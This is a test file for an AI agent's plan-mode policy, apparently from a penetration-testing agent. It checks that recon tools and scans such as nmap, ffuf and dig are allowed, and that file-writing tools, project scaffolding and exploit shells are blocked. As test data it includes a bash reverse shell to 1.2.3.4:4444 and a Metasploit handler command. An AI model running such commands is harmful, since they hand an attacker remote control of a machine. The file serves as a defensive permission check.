import { describe, expect, it } from "vitest";
import {
  isPlanModeAllowedShellCommand,
  isPlanModeAllowedTool,
} from "../src/agent/session-policy.js";

describe("plan mode gather-only policy", () => {
  it("allows recon tools", () => {
    for (const name of [
      "http.fetch",
      "net.scan",
      "pentest.recon",
      "dns.lookup",
      "whois.lookup",
      "web.search",
      "tool.check",
      "wordlist.find",
      "shell.exec",
      "pkg.install",
      "plan.create",
    ]) {
      expect(isPlanModeAllowedTool(name)).toBe(true);
    }
  });

  it("blocks project file mutation tools", () => {
    for (const name of [
      "fs.write",
      "fs.writeMany",
      "fs.edit",
      "fs.append",
      "fs.replaceLines",
      "fs.delete",
    ]) {
      expect(isPlanModeAllowedTool(name)).toBe(false);
    }
  });

  it("allows recon shells and long scans", () => {
    expect(isPlanModeAllowedShellCommand("nmap -sV --top-ports 1000 example.com")).toBe(
      true,
    );
    expect(
      isPlanModeAllowedShellCommand("ffuf -u https://t/FUZZ -w /usr/share/wordlists/dir.txt"),
    ).toBe(true);
    expect(isPlanModeAllowedShellCommand("dig +short example.com ANY")).toBe(true);
  });

  it("blocks scaffold and clear exploit shells", () => {
    expect(
      isPlanModeAllowedShellCommand(
        "npm create vite@latest blog -- --template react",
      ),
    ).toBe(false);
    expect(
      isPlanModeAllowedShellCommand("msfconsole -q -x 'use exploit/multi/handler'"),
    ).toBe(false);
    expect(
      isPlanModeAllowedShellCommand("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
    ).toBe(false);
  });
});
